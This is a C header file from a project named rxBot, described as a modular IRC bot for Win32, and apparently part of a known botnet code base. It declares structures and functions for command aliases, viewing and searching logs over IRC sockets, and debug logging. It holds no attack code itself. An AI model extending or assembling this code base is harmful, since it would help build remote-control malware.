/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

// alias structure
typedef struct ALIAS 
{
	 char name[30];
	 char command[MAXCMDLEN];

} ALIAS;

typedef struct SHOWLOG
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	char filter[LOGLINE];
	int threadnum;
	BOOL checkcase;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SHOWLOG;

int addalias(char *name, char *command);
void aliaslist(SOCKET sock, char *chan, BOOL notice);
void addlog(char *desc);
void addlogv(char *desc, ...);
void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter);
void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent);
BOOL searchlog(char *filter, BOOL checkcase=FALSE);
DWORD WINAPI ShowLogThread(LPVOID param);
#ifdef DEBUG_LOGGING
void opendebuglog(void);
void debuglog(char *buffer,BOOL crlf=TRUE);
void closedebuglog(void);
#endif
#ifdef DEBUG_CONSOLE
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);
void OpenConsole(void);
#endif